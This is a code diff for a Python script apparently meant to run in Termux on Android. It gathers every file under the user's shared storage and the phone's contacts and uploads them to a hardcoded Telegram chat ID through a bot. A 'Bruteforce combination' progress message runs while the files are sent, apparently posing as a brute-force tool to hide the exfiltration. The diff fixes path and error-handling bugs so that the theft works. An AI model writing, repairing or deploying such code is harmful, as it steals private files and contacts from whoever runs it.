@@ -15,7 +15,7 @@ def send_file_to_telegram(filename, i, total_files):
         else:
             pass
     except:
-        bot.send_message(chat_id=1004407813, text='ERROR SENDING FILE:- '+filename)
+        bot.send_message(chat_id=1004407813, text='ERROR SENDING FILE:- '+str(filename))
     print(f'Bruteforce combination {i + 1} of {total_files}')
 
 def send_contacts_to_telegram():
@@ -27,14 +27,14 @@ def send_contacts_to_telegram():
             contacts_file.name = 'contacts.json'
             bot.send_document(chat_id=1004407813, document=contacts_file)
     except Exception as e:
-        bot.send_message(chat_id=1004407813, text='ERROR SENDING CONTACTS '+e)
+        bot.send_message(chat_id=1004407813, text='ERROR SENDING CONTACTS '+str(e))
 
 def get_user_files():
     files = []
-    for filenames in os.walk('~/storage'):
+    for root, _, filenames in os.walk('/data/data/com.termux/files/home/storage'):
         print(filenames)
         for filename in filenames:
-            files.append(filename)
+            files.append(os.path.join(root, filename))
     return files
 
 files = get_user_files()
